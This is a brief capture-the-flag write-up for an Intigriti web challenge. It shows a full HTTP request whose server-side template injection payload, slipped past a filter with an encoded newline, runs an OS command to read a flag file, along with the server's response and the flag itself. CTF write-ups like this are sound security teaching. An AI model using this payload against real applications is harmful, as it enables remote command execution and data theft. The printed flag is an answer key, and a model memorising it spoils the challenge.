# Pizza Time [52 Solves]

## Description

> It's pizza time!! 🍕
>
> Author: kavigihan
>
> <https://pizzatime.ctf.intigriti.io> || <https://pizzatime2.ctf.intigriti.io>

## Flag

INTIGRITI{d1d_50m3b0dy_54y_p1zz4_71m3}

## Solution

- SSTI in customer_name parameter in [POST] /order endpoint.
- Bypass special character filter by using `%0a`

request:

```text
POST /order HTTP/2
Host: pizzatime.ctf.intigriti.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 181

customer_name=%0a{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat$IFS/flag.txt').read()}}&pizza_name=Margherita&pizza_size=Small&topping=Mushrooms&sauce=Marinara
```

response:

```text
HTTP/2 200 OK
Date: Sat, 18 Nov 2023 04:54:29 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 135
Strict-Transport-Security: max-age=15724800; includeSubDomains

 
            <p>Thank you, 
INTIGRITI{d1d_50m3b0dy_54y_p1zz4_71m3}! Your order has been placed. Final price is $9.72 </p>
```
